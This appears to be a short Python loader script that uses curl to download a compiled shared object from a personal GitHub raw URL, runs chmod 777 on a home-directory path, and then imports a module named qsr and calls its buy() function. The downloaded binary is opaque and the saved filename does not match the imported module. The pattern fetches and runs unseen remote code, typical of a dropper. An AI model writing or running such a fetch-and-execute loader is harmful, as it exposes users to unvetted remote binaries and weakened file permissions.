import re,os,sys
try:
    download_link = "https://raw.githubusercontent.com/ffdvl1120/cc/main/pycrypto_qsr.cpython-311.so"
    if not os.path.exists("pycrypto_qsr.cpython-311.so"):
        os.system("chmod 777 $HOME/Qsr")
        os.system(f'curl -L {download_link} > pycrypto_qsr.cpython-311.so')
        import qsr
        qsr.buy()
    else:
        import qsr
        qsr.buy()
except PermissionError:
    exit('Permission Error ! Found')
except ConnectionError:
    exit('Network Error ! Found')
except Exception as e:
    print(e)